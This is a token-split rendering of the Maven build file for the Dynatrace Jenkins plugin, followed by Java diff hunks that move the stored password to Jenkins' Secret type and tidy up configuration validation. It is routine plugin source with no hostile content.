"\"", "xmlns", ":", "xsi", "=", "\"", "http", ":", "//", "www", ".", "w3", ".", "org", "/", "2001", "/", "XMLSchema", "-", "instance", "\"", "xsi", ":", "schemaLocation", "=", "\"", "http", ":", "//", "maven", ".", "apache", ".", "org", "/", "POM", "/", "4", ".", "0", ".", "0", "http", ":", "//", "maven", ".", "apache", ".", "org", "/", "maven", "-", "v4_0_0", ".", "xsd", "\"", ">", "<", "modelVersion", ">", "4", ".", "0", ".", "0", "<", "/", "modelVersion", ">", "<", "parent", ">", "<", "groupId", ">", "org", ".", "jenkins", "-", "ci", ".", "plugins", "<", "/", "groupId", ">", "<", "artifactId", ">", "plugin", "<", "/", "artifactId", ">", "<", "version", ">", "2", ".", "8", "<", "/", "version", ">", "<!", "--", "which", "version", "of", "Jenkins", "is", "this", "plugin", "built", "against", "?", "-", "->", "<", "/", "parent", ">", "<", "artifactId", ">", "dynatrace", "-", "dashboard", "<", "/", "artifactId", ">", "<", "version", ">", "2", ".", "1", ".", "4", "-", "SNAPSHOT", "<", "/", "version", ">", "<", "packaging", ">", "hpi", "<", "/", "packaging", ">", "<", "name", ">", "Dynatrace", "Application", "Monitoring", "Plugin", "<", "/", "name", ">", "<", "url", ">", "https", ":", "//", "wiki", ".", "jenkins", "-", "ci", ".", "org", "/", "display", "/", "JENKINS", "/", "Dynatrace", "+", "Plugin", "<", "/", "url", ">", "<", "scm", ">", "<", "connection", ">", "scm", ":", "git", ":", "ssh", ":", "//", "github", ".", "com", "/", "jenkinsci", "/", "dynatrace", "-", "plugin", ".", "git", "<", "/", "connection", ">", "<", "developerConnection", ">", "scm", ":", "git", ":", "ssh", ":", "//", "git", "@", "github", ".", "com", "/", "jenkinsci", "/", "dynatrace", "-", "plugin", ".", "git", "<", "/", "developerConnection", ">", "<", "url", ">", "https", ":", "//", "github", ".", "com", "/", "jenkinsci", "/", "dynatrace", "-", "plugin", "<", "/", "url", ">", "<", "tag", ">", "HEAD", "<", "/", "tag", ">", "<", "/", "scm", ">", "<", "developers", ">", "<", "developer", ">", "<", "id", ">", "dynatrace", "<", "/", "id", ">", "<", "name", ">", "Dynatrace", "Development", "Team", "<", "/", "name", ">", "<", "email", ">", "Jenkins", ".", "Plugin", "@", "dynatrace", ".", "com", "<", "/", "email", ">", "<", "/", "developer", ">", "<", "developer", ">", "<", "id", ">", "dariusz", ".", "glugla", "<", "/", "id", ">", "<", "name", ">", "Dariusz", "Glugla", "<", "/", "name", ">", "<", "email", ">", "dariusz", ".", "glugla", "@", "dynatrace", ".", "com", "<", "/", "email", ">", "<", "/", "developer", ">", "<", "developer", ">", "<", "id", ">", "piotr", ".", "lugowski", "<", "/", "id", ">", "<", "name", ">", "Piotr", "Lugowski", "<", "/", "name", ">", "<", "email", ">", "piotr", ".", "lugowski", "@", "dynatrace", ".", "com", "<", "/", "email", ">", "<", "/", "developer", ">", "<", "/", "developers", ">", "<", "properties", ">", "<", "project", ".", "build", ".", "sourceEncoding", ">", "UTF", "-", "8", "<", "/", "project", ".", "build", ".", "sourceEncoding", ">", "<", "jenkins", ".", "version", ">", "2", ".", "0", "<", "/", "jenkins", ".", "version", ">", "<", "findbugs", ".", "skip", ">", "true", "<", "/", "findbugs", ".", "skip", ">", "<", "argLine", "/", ">", "<", "/", "properties", ">", "<", "build", ">", "<", "plugins", ">", "<", "plugin", ">", "<", "artifactId", ">", "maven", "-", "clean", "-", "plugin", "<", "/", "artifactId", ">", "<", "version", ">", "3", ".", "0", ".", "0", "<", "/", "version", ">", "<", "/", "plugin", ">", "<", "plugin", ">", "<", "groupId", ">", "org", ".", "apache", ".", "maven", ".", "plugins", "<", "/", "groupId", ">", "<", "artifactId", ">", "maven", "-", "compiler", "-", "plugin", "<", "/", "artifactId", ">", "<", "version", ">", "3", ".", "5", ".", "1", "<", "/", "version", ">", "<", "configuration", ">", "<", "source", ">", "1", ".", "7", "<", "/", "source", ">", "<", "target", ">", "1", ".", "7", "<", "/", "target", ">", "<", "showWarnings", ">", "true", "<", "/", "showWarnings", ">", "<", "/", "configuration", ">", "<", "/", "plugin", ">", "<", "/", "plugins", ">", "<", "/", "build", ">", "<", "dependencies", ">", "<", "dependency", ">", "<", "groupId", ">", "com", ".", "sun", ".", "jersey", "<", "/", "groupId", ">", "<", "artifactId", ">", "jersey", "-", "client", "<", "/", "artifactId", ">", "<", "version", ">", "1", ".", "16", "<", "/", "version", ">", "<", "/", "dependency", ">", "<", "dependency", ">", "<", "groupId", ">", "joda", "-", "time", "<", "/", "groupId", ">", "<", "artifactId", ">", "joda", "-", "time", "<", "/", "artifactId", ">", "<", "version", ">", "2", ".", "1", "<", "/", "version", ">", "<", "/", "dependency", ">", "<", "dependency", ">", "<", "groupId", ">", "com", ".", "dynatrace", ".", "sdk", "<", "/", "groupId", ">", "<", "artifactId", ">", "server", "-", "rest", "-", "sdk", "<", "/", "artifactId", ">", "<", "version", ">", "7", ".", "0", ".", "0", "<", "/", "version", ">", "<", "/", "dependency", ">", "<", "dependency", ">", "<", "groupId", ">", "junit", "<", "/", "groupId", ">", "<", "artifactId", ">", "junit", "<", "/", "artifactId", ">", "<", "version", ">", "4", ".", "12", "<", "/", "version", ">", "<", "scope", ">", "test", "<", "/", "scope", ">", "<", "/", "dependency", ">", "<", "dependency", ">", "<", "groupId", ">", "org", ".", "hamcrest", "<", "/", "groupId", ">", "<", "artifactId", ">", "hamcrest", "-", "library", "<", "/", "artifactId", ">", "<", "version", ">", "1", ".", "3", "<", "/", "version", ">", "<", "scope", ">", "test", "<", "/", "scope", ">", "<", "/", "dependency", ">", "<", "dependency", ">", "<", "groupId", ">", "org", ".", "mockito", "<", "/", "groupId", ">", "<", "artifactId", ">", "mockito", "-", "core", "<", "/", "artifactId", ">", "<", "version", ">", "2", ".", "0", ".", "57", "-", "beta", "<", "/", "version", ">", "<", "scope", ">", "test", "<", "/", "scope", ">", "<", "/", "dependency", ">", "<", "!-", "-", "dependencies", "on", "Jenkins", "Pipeline", "plugin", "-", "->", "<", "dependency", ">", "<", "groupId", ">", "org", ".", "jenkins", "-", "ci", ".", "plugins", ".", "workflow", "<", "/", "groupId", ">", "<", "artifactId", ">", "workflow", "-", "job", "<", "/", "artifactId", ">", "<", "version", ">", "2", ".", "6", "<", "/", "version", ">", "<", "/", "dependency", ">", "<", "dependency", ">", "<", "groupId", ">", "org", ".", "jenkins", "-", "ci", ".", "plugins", ".", "workflow", "<", "/", "groupId", ">", "<", "artifactId", ">", "workflow", "-", "cps", "<", "/", "artifactId", ">", "<", "version", ">", "2", ".", "0", "<", "/", "version", ">", "<", "/", "dependency", ">", "<", "dependency", ">", "<", "groupId", ">", "org", ".", "jenkins", "-", "ci", ".", "plugins", ".", "workflow", "<", "/", "groupId", ">", "<", "artifactId", ">", "workflow", "-", "basic", "-", "steps", "<", "/", "artifactId", ">", "<", "version", ">", "2", ".", "6", "<", "/", "version", ">", "<", "/", "dependency", ">", "<", "dependency", ">", "<", "groupId", ">", "org", ".", "jenkins", "-", "ci", "<", "/", "groupId", ">", "<", "artifactId", ">", "symbol", "-", "annotation", "<", "/", "artifactId", ">", "<", "version", ">", "1", ".", "1", "<", "/", "version", ">", "<", "/", "dependency", ">", "<", "/", "dependencies", ">", "<", "repositories", ">", "<", "repository", ">", "<", "id", ">", "repo", ".", "jenkins", "-", "ci", ".", "org", "<", "/", "id", ">", "<", "url", ">", "http", ":", "//", "repo", ".", "jenkins", "-", "ci", ".", "org", "/", "public", "/", "</", "url", ">", "<", "/", "repository", ">", "<", "repository", ">", "<", "id", ">", "local", "-", "repo", "<", "/", "id", ">", "<", "releases", ">", "<", "enabled", ">", "true", "<", "/", "enabled", ">", "<", "checksumPolicy", ">", "ignore", "<", "/", "checksumPolicy", ">", "<", "/", "releases", ">", "<", "snapshots", ">", "<", "enabled", ">", "false", "<", "/", "enabled", ">", "<", "/", "snapshots", ">", "<", "url", ">", "file", ":", "//", "${", "project", ".", "basedir", "}", "/", "repo", "<", "/", "url", ">", "<", "/", "repository", ">", "<", "/", "repositories", ">", "<", "pluginRepositories", ">", "<", "pluginRepository", ">", "<", "id", ">", "repo", ".", "jenkins", "-", "ci", ".", "org", "<", "/", "id", ">", "<", "url", ">", "http", ":", "//", "repo", ".", "jenkins", "-", "ci", ".", "org", "/", "public", "/", "</", "url", ">", "<", "/", "pluginRepository", ">", "<", "/", "pluginRepositories", ">", "<", "/", "project", ">", "<", "?", "xml", "version", "=", "\"", "1", ".", "0", "\"", "?>", "<", "!-", "-", "Copyright", "(", "c", ")", "2008", "-", "2016", ",", "DYNATRACE", "LLC", "All", "rights", "reserved", ".", "Redistribution", "and", "use", "in", "source", "and", "binary", "forms", ",", "with", "or", "without", "modification", ",", "are", "permitted", "provided", "that", "the", "following", "conditions", "are", "met", ":", "*", "Redistributions", "of", "source", "code", "must", "retain", "the", "above", "copyright", "notice", ",", "this", "list", "of", "conditions", "and", "the", "following", "disclaimer", ".", "*", "Redistributions", "in", "binary", "form", "must", "reproduce", "the", "above", "copyright", "notice", ",", "this", "list", "of", "conditions", "and", "the", "following", "disclaimer", "in", "the", "documentation", "and", "/", "or", "other", "materials", "provided", "with", "the", "distribution", ".", "*", "Neither", "the", "name", "of", "the", "dynaTrace", "software", "nor", "the", "names", "of", "its", "contributors", "may", "be", "used", "to", "endorse", "or", "promote", "products", "derived", "from", "this", "software", "without", "specific", "prior", "written", "permission", ".", "THIS", "SOFTWARE", "IS", "PROVIDED", "BY", "THE", "COPYRIGHT", "HOLDERS", "AND", "CONTRIBUTORS", "\"", "AS", "IS", "\"", "AND", "ANY", "EXPRESS", "OR", "IMPLIED", "WARRANTIES", ",", "INCLUDING", ",", "BUT", "NOT", "LIMITED", "TO", ",", "THE", "IMPLIED", "WARRANTIES", "OF", "MERCHANTABILITY", "AND", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "ARE", "DISCLAIMED", ".", "IN", "NO", "EVENT", "SHALL", "THE", "COPYRIGHT", "OWNER", "OR", "CONTRIBUTORS", "BE", "LIABLE", "FOR", "ANY", "DIRECT", ",", "INDIRECT", ",", "INCIDENTAL", ",", "SPECIAL", ",", "EXEMPLARY", ",", "OR", "CONSEQUENTIAL", "DAMAGES", "(", "INCLUDING", ",", "BUT", "NOT", "LIMITED", "TO", ",", "PROCUREMENT", "OF", "SUBSTITUTE", "GOODS", "OR", "SERVICES", ";", "LOSS", "OF", "USE", ",", "DATA", ",", "OR", "PROFITS", ";", "OR", "BUSINESS", "INTERRUPTION", ")", "HOWEVER", "CAUSED", "AND", "ON", "ANY", "THEORY", "OF", "LIABILITY", ",", "WHETHER", "IN", "CONTRACT", ",", "STRICT", "LIABILITY", ",", "OR", "TORT", "(", "INCLUDING", "NEGLIGENCE", "OR", "OTHERWISE", ")", "ARISING", "IN", "ANY", "WAY", "OUT", "OF", "THE", "USE", "OF", "THIS", "SOFTWARE", ",", "EVEN", "IF", "ADVISED", "OF", "THE", "POSSIBILITY", "OF", "SUCH", "DAMAGE", ".", "-", "->", "<", "project", "xmlns", "=", "\"", "http", ":", "//", "maven", ".", "apache", ".", "org", "/", "POM", "/", "4", ".", "0", ".", "0", "\"", "xmlns", ":", "xsi", "=", "\"", "http", ":", "//", "www", ".", "w3", ".", "org", "/", "2001", "/", "XMLSchema", "-", "instance", "\"", "xsi", ":", "schemaLocation", "=", "\"", "http", ":", "//", "maven", ".", "apache", ".", "org", "/", "POM", "/", "4", ".", "0", ".", "0", "http", ":", "//", "maven", ".", "apache", ".", "org", "/", "maven", "-", "v4_0_0", ".", "xsd", "\"", ">", "<", "modelVersion", ">", "4", ".", "0", ".", "0", "<", "/", "modelVersion", ">", "<", "parent", ">", "<", "groupId", ">", "org", ".", "jenkins", "-", "ci", ".", "plugins", "<", "/", "groupId", ">", "<", "artifactId", ">", "plugin", "<", "/", "artifactId", ">", "<", "version", ">", "2", ".", "8", "<", "/", "version", ">", "<!", "--", "which", "version", "of", "Jenkins", "is", "this", "plugin", "built", "against", "?", "-", "->", "<", "/", "parent", ">", "<", "artifactId", ">", "dynatrace", "-", "dashboard", "<", "/", "artifactId", ">", "<", "version", ">", "2", ".", "1", ".", "4", "-", "SNAPSHOT", "<", "/", "version", ">", "<", "packaging", ">", "hpi", "<", "/", "packaging", ">", "<", "name", ">", "Dynatrace", "Application", "Monitoring", "Plugin", "<", "/", "name", ">", "<", "url", ">", "https", ":", "//", "wiki", ".", "jenkins", "-", "ci", ".", "org", "/", "display", "/", "JENKINS", "/", "Dynatrace", "+", "Plugin", "<", "/", "url", ">", "<", "scm", ">", "<", "connection", ">", "scm", ":", "git", ":", "ssh", ":", "//", "github", ".", "com", "/", "jenkinsci", "/", "dynatrace", "-", "plugin", ".", "git", "<", "/", "connection", ">", "<", "developerConnection", ">", "scm", ":", "git", ":", "ssh", ":", "//", "git", "@", "github", ".", "com", "/", "jenkinsci", "/", "dynatrace", "-", "plugin", ".", "git", "<", "/", "developerConnection", ">", "<", "url", ">", "https", ":", "//", "github", ".", "com", "/", "jenkinsci", "/", "dynatrace", "-", "plugin", "<", "/", "url", ">", "<", "tag", ">", "HEAD", "<", "/", "tag", ">", "<", "/", "scm", ">", "<", "developers", ">", "<", "developer", ">", "<", "id", ">", "dynatrace", "<", "/", "id", ">", "<", "name", ">", "Dynatrace", "Development", "Team", "<", "/", "name", ">", "<", "email", ">", "Jenkins", ".", "Plugin", "@", "dynatrace", ".", "com", "<", "/", "email", ">", "<", "/", "developer", ">", "<", "developer", ">", "<", "id", ">", "dariusz", ".", "glugla", "<", "/", "id", ">", "<", "name", ">", "Dariusz", "Glugla", "<", "/", "name", ">", "<", "email", ">", "dariusz", ".", "glugla", "@", "dynatrace", ".", "com", "<", "/", "email", ">", "<", "/", "developer", ">", "<", "developer", ">", "<", "id", ">", "piotr", ".", "lugowski", "<", "/", "id", ">", "<", "name", ">", "Piotr", "Lugowski", "<", "/", "name", ">", "<", "email", ">", "piotr", ".", "lugowski", "@", "dynatrace", ".", "com", "<", "/", "email", ">", "<", "/", "developer", ">", "<", "/", "developers", ">", "<", "properties", ">", "<", "project", ".", "build", ".", "sourceEncoding", ">", "UTF", "-", "8", "<", "/", "project", ".", "build", ".", "sourceEncoding", ">", "<", "jenkins", ".", "version", ">", "2", ".", "0", "<", "/", "jenkins", ".", "version", ">", "<", "checkstyle", ".", "skip", ">", "true", "<", "/", "checkstyle", ".", "skip", ">", "<", "findbugs", ".", "skip", ">", "true", "<", "/", "findbugs", ".", "skip", ">", "<", "argLine", "/", ">", "<", "java", ".", "level", ">", "8", "<", "/", "java", ".", "level", ">", "<", "/", "properties", ">", "<", "build", ">", "<", "plugins", ">", "<", "plugin", ">", "<", "artifactId", ">", "maven", "-", "clean", "-", "plugin", "<", "/", "artifactId", ">", "<", "version", ">", "3", ".", "0", ".", "0", "<", "/", "version", ">", "<", "/", "plugin", ">", "<", "plugin", ">", "<", "groupId", ">", "org", ".", "apache", ".", "maven", ".", "plugins", "<", "/", "groupId", ">", "<", "artifactId", ">", "maven", "-", "compiler", "-", "plugin", "<", "/", "artifactId", ">", "<", "version", ">", "3", ".", "5", ".", "1", "<", "/", "version", ">", "<", "configuration", ">", "<", "source", ">", "8", "<", "/", "source", ">", "<", "target", ">", "8", "<", "/", "target", ">", "<", "showWarnings", ">", "true", "<", "/", "showWarnings", ">", "<", "/", "configuration", ">", "<", "/", "plugin", ">", "<", "plugin", ">", "<", "groupId", ">", "org", ".", "codehaus", ".", "mojo", "<", "/", "groupId", ">", "<", "artifactId", ">", "findbugs", "-", "maven", "-", "plugin", "<", "/", "artifactId", ">", "<", "version", ">", "3", ".", "0", ".", "5", "<", "/", "version", ">", "<", "/", "plugin", ">", "<", "/", "plugins", ">", "<", "/", "build", ">", "<", "dependencies", ">", "<", "dependency", ">", "<", "groupId", ">", "com", ".", "sun", ".", "jersey", "<", "/", "groupId", ">", "<", "artifactId", ">", "jersey", "-", "client", "<", "/", "artifactId", ">", "<", "version", ">", "1", ".", "16", "<", "/", "version", ">", "<", "/", "dependency", ">", "<", "dependency", ">", "<", "groupId", ">", "joda", "-", "time", "<", "/", "groupId", ">", "<", "artifactId", ">", "joda", "-", "time", "<", "/", "artifactId", ">", "<", "version", ">", "2", ".", "1", "<", "/", "version", ">", "<", "/", "dependency", ">", "<", "dependency", ">", "<", "groupId", ">", "com", ".", "dynatrace", ".", "sdk", "<", "/", "groupId", ">", "<", "artifactId", ">", "server", "-", "rest", "-", "sdk", "<", "/", "artifactId", ">", "<", "version", ">", "7", ".", "0", ".", "0", "<", "/", "version", ">", "<", "/", "dependency", ">", "<", "dependency", ">", "<", "groupId", ">", "junit", "<", "/", "groupId", ">", "<", "artifactId", ">", "junit", "<", "/", "artifactId", ">", "<", "version", ">", "4", ".", "12", "<", "/", "version", ">", "<", "scope", ">", "test", "<", "/", "scope", ">", "<", "/", "dependency", ">", "<", "dependency", ">", "<", "groupId", ">", "org", ".", "hamcrest", "<", "/", "groupId", ">", "<", "artifactId", ">", "hamcrest", "-", "library", "<", "/", "artifactId", ">", "<", "version", ">", "1", ".", "3", "<", "/", "version", ">", "<", "scope", ">", "test", "<", "/", "scope", ">", "<", "/", "dependency", ">", "<", "dependency", ">", "<", "groupId", ">", "org", ".", "mockito", "<", "/", "groupId", ">", "<", "artifactId", ">", "mockito", "-", "core", "<", "/", "artifactId", ">", "<", "version", ">", "2", ".", "0", ".", "57", "-", "beta", "<", "/", "version", ">", "<", "scope", ">", "test", "<", "/", "scope", ">", "<", "/", "dependency", ">", "<", "!-", "-", "dependencies", "on", "Jenkins", "Pipeline", "plugin", "-", "->", "<", "dependency", ">", "<", "groupId", ">", "org", ".", "jenkins", "-", "ci", ".", "plugins", ".", "workflow", "<", "/", "groupId", ">", "<", "artifactId", ">", "workflow", "-", "job", "<", "/", "artifactId", ">", "<", "version", ">", "2", ".", "6", "<", "/", "version", ">", "<", "/", "dependency", ">", "<", "dependency", ">", "<", "groupId", ">", "org", ".", "jenkins", "-", "ci", ".", "plugins", ".", "workflow", "<", "/", "groupId", ">", "<", "artifactId", ">", "workflow", "-", "cps", "<", "/", "artifactId", ">", "<", "version", ">", "2", ".", "0", "<", "/", "version", ">", "<", "/", "dependency", ">", "<", "dependency", ">", "<", "groupId", ">", "org", ".", "jenkins", "-", "ci", ".", "plugins", ".", "workflow", "<", "/", "groupId", ">", "<", "artifactId", ">", "workflow", "-", "basic", "-", "steps", "<", "/", "artifactId", ">", "<", "version", ">", "2", ".", "6", "<", "/", "version", ">", "<", "/", "dependency", ">", "<", "dependency", ">", "<", "groupId", ">", "org", ".", "jenkins", "-", "ci", "<", "/", "groupId", ">", "<", "artifactId", ">", "symbol", "-", "annotation", "<", "/", "artifactId", ">", "<", "version", ">", "1", ".", "1", "<", "/", "version", ">", "<", "/", "dependency", ">", "<", "/", "dependencies", ">", "<", "repositories", ">", "<", "repository", ">", "<", "id", ">", "repo", ".", "jenkins", "-", "ci", ".", "org", "<", "/", "id", ">", "<", "url", ">", "http", ":", "//", "repo", ".", "jenkins", "-", "ci", ".", "org", "/", "public", "/", "</", "url", ">", "<", "/", "repository", ">", "<", "repository", ">", "<", "id", ">", "local", "-", "repo", "<", "/", "id", ">", "<", "releases", ">", "<", "enabled", ">", "true", "<", "/", "enabled", ">", "<", "checksumPolicy", ">", "ignore", "<", "/", "checksumPolicy", ">", "<", "/", "releases", ">", "<", "snapshots", ">", "<", "enabled", ">", "false", "<", "/", "enabled", ">", "<", "/", "snapshots", ">", "<", "url", ">", "file", ":", "//", "${", "project", ".", "basedir", "}", "/", "repo", "<", "/", "url", ">", "<", "/", "repository", ">", "<", "/", "repositories", ">", "<", "pluginRepositories", ">", "<", "pluginRepository", ">", "<", "id", ">", "repo", ".", "jenkins", "-", "ci", ".", "org", "<", "/", "id", ">", "<", "url", ">", "http", ":", "//", "repo", ".", "jenkins", "-", "ci", ".", "org", "/", "public", "/", "</", "url", ">", "<", "/", "pluginRepository", ">", "<", "/", "pluginRepositories", ">", "<", "/", "project", ">", "@", "@", "-", "88", ",", "16", "+", "88", ",", "17", "@", "@", "public", "final", "String", "systemProfile", ";", "/", "/", "Test", "run", "attributes", "-", "no", "versionBuild", "attribute", "because", "it", "'", "s", "taken", "from", "the", "build", "object", "public", "String", "versionMajor", ";", "public", "String", "versionMinor", ";", "public", "String", "versionRevision", ";", "public", "String", "versionMilestone", ";", "public", "String", "marker", ";", "public", "Boolean", "recordSession", ";", "private", "String", "versionMajor", ";", "private", "String", "versionMinor", ";", "private", "String", "versionRevision", ";", "private", "String", "versionMilestone", ";", "private", "String", "marker", ";", "private", "Boolean", "recordSession", ";", "/", "**", "*", "@", "deprecated", "use", "{", "@", "link", "#", "TABuildWrapper", "(", "String", "systemProfile", ")", "}", "and", "DataBoundSetters", "instead", ".", "*", "/", "@", "SuppressWarnings", "(", "\"", "DeprecatedIsStillUsed", "\"", ")", "private", "TABuildWrapper", "(", "final", "String", "systemProfile", ",", "final", "String", "versionMajor", ",", "final", "String", "versionMinor", ",", "final", "String", "versionRevision", ",", "final", "String", "versionMilestone", ",", "final", "String", "marker", ",", "final", "Boolean", "recordSession", ")", "{", "@", "@", "-", "110", ",", "6", "+", "111", ",", "7", "@", "@", "private", "TABuildWrapper", "(", "final", "String", "systemProfile", ",", "final", "String", "versionMajor", ",", "fi", "this", ".", "recordSession", "=", "recordSession", ";", "}", "@", "SuppressWarnings", "(", "\"", "WeakerAccess", "\"", ")", "@", "DataBoundConstructor", "public", "TABuildWrapper", "(", "String", "systemProfile", ")", "{", "this", "(", "systemProfile", ",", "\"", "\",", "\"", "\",", "\"", "\",", "\"", "\",", "\"", "\",", "false", ")", ";", "@", "@", "-", "145", ",", "6", "+", "147", ",", "7", "@", "@", "public", "void", "setRecordSession", "(", "Boolean", "recordSession", ")", "{", "this", ".", "recordSession", "=", "recordSession", ";", "}", "@", "SuppressWarnings", "(", "\"", "RedundantThrows", "\"", ")", "@", "Override", "public", "void", "setUp", "(", "Context", "context", ",", "Run", "<", "?,", "?", ">", "build", ",", "FilePath", "workspace", ",", "Launcher", "launcher", ",", "TaskListener", "listener", ",", "EnvVars", "initialEnvironment", ")", "throws", "IOException", ",", "InterruptedException", "{", "Sessions", "sessions", "=", "new", "Sessions", "(", "Utils", ".", "createClient", "(", "))", ";", "@", "@", "-", "204", ",", "8", "+", "207", ",", "8", "@", "@", "private", "void", "setupBuildVariables", "(", "Run", "<", "?,", "?>", "build", ",", "String", "serverUrl", ")", "{", "if", "(", "StringUtils", ".", "isNotEmpty", "(", "globalConfig", ".", "username", ")", ")", "{", "parameters", ".", "add", "(", "new", "StringParameterValue", "(", "BuildVarKeys", ".", "BUILD_VAR_KEY_GLOBAL_USERNAME", ",", "globalConfig", ".", "username", ")", ");", "}", "if", "(", "StringUtils", ".", "isNotEmpty", "(", "globalConfig", ".", "password", ")", ")", "{", "parameters", ".", "add", "(", "new", "PasswordParameterValue", "(", "BuildVarKeys", ".", "BUILD_VAR_KEY_GLOBAL_PASSWORD", ",", "globalConfig", ".", "password", ")", ");", "if", "(", "StringUtils", ".", "isNotEmpty", "(", "globalConfig", ".", "password", ".", "getPlainText", "(", "))", ")", "{", "parameters", ".", "add", "(", "new", "PasswordParameterValue", "(", "BuildVarKeys", ".", "BUILD_VAR_KEY_GLOBAL_PASSWORD", ",", "globalConfig", ".", "password", ".", "getPlainText", "(", "))", ");", "}", "}", "Utils", ".", "updateBuildVariables", "(", "build", ",", "parameters", ")", ";", "@", "@", "-", "235", ",", "9", "+", "238", ",", "8", "@", "@", "public", "boolean", "isApplicable", "(", "AbstractProject", "<", "?,", "?", ">", "abstractProject", ")", "{", "public", "FormValidation", "doCheckSystemProfile", "(", "@", "QueryParameter", "final", "String", "systemProfile", ")", "{", "if", "(", "StringUtils", ".", "isNotBlank", "(", "systemProfile", ")", ")", "{", "return", "FormValidation", ".", "ok", "(", ");", "}", "else", "{", "return", "FormValidation", ".", "error", "(", "Messages", ".", "RECORDER_VALIDATION_BLANK_SYSTEM_PROFILE", "(", "))", ";", "}", "return", "FormValidation", ".", "error", "(", "Messages", ".", "RECORDER_VALIDATION_BLANK_SYSTEM_PROFILE", "(", "))", ";", "}", "public", "FormValidation", "doTestDynatraceConnection", "(", "@", "QueryParameter", "final", "String", "systemProfile", ")", "{", "@", "@", "-", "297", ",", "6", "+", "299", ",", "7", "@", "@", "private", "String", "storeSession", "(", "final", "PrintStream", "logger", ",", "Sessions", "sessions", ")", "throws", "return", "sessionName", ";", "}", "@", "SuppressWarnings", "(", "\"", "RedundantThrows", "\"", ")", "@", "Override", "public", "void", "tearDown", "(", "Run", "<", "?,", "?", ">", "build", ",", "FilePath", "workspace", ",", "Launcher", "launcher", ",", "TaskListener", "listener", ")", "throws", "IOException", ",", "InterruptedException", "{", "PrintStream", "logger", "=", "listener", ".", "getLogger", "(", ");", "@", "@", "-", "37", ",", "12", "+", "37", ",", "14", "@", "@", "import", "hudson", ".", "Extension", ";", "import", "hudson", ".", "util", ".", "FormValidation", ";", "import", "hudson", ".", "util", ".", "ListBoxModel", ";", "import", "hudson", ".", "util", ".", "Secret", ";", "import", "jenkins", ".", "model", ".", "GlobalConfiguration", ";", "import", "net", ".", "sf", ".", "json", ".", "JSONObject", ";", "import", "org", ".", "apache", ".", "commons", ".", "lang", ".", "StringUtils", ";", "import", "org", ".", "apache", ".", "commons", ".", "lang", ".", "exception", ".", "ExceptionUtils", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "QueryParameter", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "StaplerRequest", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "interceptor", ".", "RequirePOST", ";", "import", "javax", ".", "net", ".", "ssl", ".", "SSLHandshakeException", ";", "@", "@", "-", "51", ",", "6", "+", "53", ",", "7", "@", "@", "/", "**", "*", "Created", "by", "krzysztof", ".", "necel", "on", "2016", "-", "02", "-", "10", ".", "*", "/", "@", "SuppressWarnings", "(", "\"", "WeakerAccess", "\"", ")", "@", "Extension", "public", "class", "TAGlobalConfiguration", "extends", "GlobalConfiguration", "{", "@", "@", "-", "62", ",", "18", "+", "65", ",", "20", "@", "@", "private", "static", "final", "int", "DEFAULT_DELAY", "=", "0", ";", "/", "/", "seconds", "private", "static", "final", "int", "DEFAULT_RETRY_COUNT", "=", "3", ";", "private", "static", "final", "boolean", "DEFAULT_VALIDATE_CERTS", "=", "true", ";", "private", "static", "final", "String", "JSON_OBJECT_NAME", "=", "\"", "dynatrace", "-", "test", "-", "automation", "\"", ";", "/", "/", "section", "name", "from", "config", ".", "jelly", "public", "String", "protocol", "=", "getDefaultProtocol", "(", ");", "public", "String", "host", "=", "getDefaultHost", "(", ");", "public", "Integer", "port", "=", "getDefaultPort", "(", ");", "public", "String", "username", "=", "getDefaultUsername", "(", ");", "public", "String", "password", "=", "getDefaultPassword", "(", ");", "public", "Secret", "password", "=", "getDefaultPassword", "(", ");", "public", "Integer", "delay", "=", "getDefaultDelay", "(", ");", "/", "/", "time", "to", "wait", "before", "trying", "to", "get", "data", "from", "the", "DT", "server", "in", "seconds", "public", "Integer", "retryCount", "=", "getDefaultRetryCount", "(", ");", "public", "Boolean", "validateCerts", "=", "getDefaultValidateCerts", "(", ");", "public", "TAGlobalConfiguration", "(", ")", "{", "load", "(", ");", "/", "/", "KN", ":", "load", "config", "from", "XML", "file", "on", "startup", "/", "/", "load", "config", "from", "XML", "file", "on", "startup", "load", "(", ");", "}", "public", "static", "String", "getDefaultProtocol", "(", ")", "{", "@", "@", "-", "92", ",", "7", "+", "97", ",", "7", "@", "@", "public", "static", "String", "getDefaultUsername", "(", ")", "{", "return", "DEFAULT_USERNAME", ";", "}", "public", "static", "String", "getDefaultPassword", "(", ")", "{", "return", "DEFAULT_PASSWORD", ";", "}", "public", "static", "Secret", "getDefaultPassword", "(", ")", "{", "return", "Secret", ".", "fromString", "(", "DEFAULT_PASSWORD", ")", ";", "}", "public", "static", "int", "getDefaultDelay", "(", ")", "{", "return", "DEFAULT_DELAY", ";", "@", "@", "-", "106", ",", "9", "+", "111", ",", "10", "@", "@", "public", "static", "boolean", "getDefaultValidateCerts", "(", ")", "{", "return", "DEFAULT_VALIDATE_CERTS", ";", "}", "@", "SuppressWarnings", "(", "\"", "RedundantThrows", "\"", ")", "@", "Override", "public", "boolean", "configure", "(", "StaplerRequest", "req", ",", "JSONObject", "json", ")", "throws", "FormException", "{", "req", ".", "bindJSON", "(", "this", ",", "json", ".", "getJSONObject", "(", "\"", "dynatrace", "-", "test", "-", "automation", "\"", "))", ";", "/", "/", "KN", ":", "section", "name", "from", "config", ".", "jelly", "req", ".", "bindJSON", "(", "this", ",", "json", ".", "getJSONObject", "(", "JSON_OBJECT_NAME", ")", ");", "save", "(", ");", "return", "true", ";", "}", "@", "@", "-", "155", ",", "6", "+", "161", ",", "7", "@", "@", "public", "FormValidation", "doCheckDelay", "(", "@", "QueryParameter", "final", "String", "delay", ")", "{", "return", "FormValidation", ".", "ok", "(", ");", "}", "}", "catch", "(", "NumberFormatException", "e", ")", "{", "/", "/", "ignore", "exception", ",", "covered", "by", "fallback", "error", "}", "return", "FormValidation", ".", "error", "(", "Messages", ".", "RECORDER_VALIDATION_DELAY_NAN", "(", "))", ";", "}", "@", "@", "-", "166", ",", "10", "+", "173", ",", "12", "@", "@", "public", "FormValidation", "doCheckRetryCount", "(", "@", "QueryParameter", "final", "String", "retryCount", ")", "return", "FormValidation", ".", "ok", "(", ");", "}", "}", "catch", "(", "NumberFormatException", "e", ")", "{", "/", "/", "ignore", "exception", ",", "covered", "by", "fallback", "error", "}", "return", "FormValidation", ".", "error", "(", "Messages", ".", 